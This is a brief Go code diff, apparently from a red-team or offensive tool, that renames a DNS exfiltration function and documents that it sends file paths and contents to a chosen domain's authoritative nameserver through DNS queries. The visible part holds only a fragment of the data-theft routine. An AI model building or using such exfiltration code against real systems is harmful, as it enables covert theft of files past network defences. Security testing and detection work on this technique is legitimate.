@@ -100,9 +100,10 @@ func Base64Encode(path string, b []byte) ([]byte, error) {
 	return []byte(base64.StdEncoding.EncodeToString(b)), nil
 }
 
-// DNSExfil will return a function pointer to an ExfilFunc that
-// exfils via DNS queries.
-func DNSExfil(domain string) ExfilFunc {
+// DNSResolvedExfil will return a function pointer to an ExfilFunc
+// that exfils by sending DNS queries to the authoritative nameserver
+// for the specified domain.
+func DNSResolvedExfil(domain string) ExfilFunc {
 	return func(path string, b []byte) error {
 		var b64 string
 		var data []byte = append([]byte(path+" "), b...)
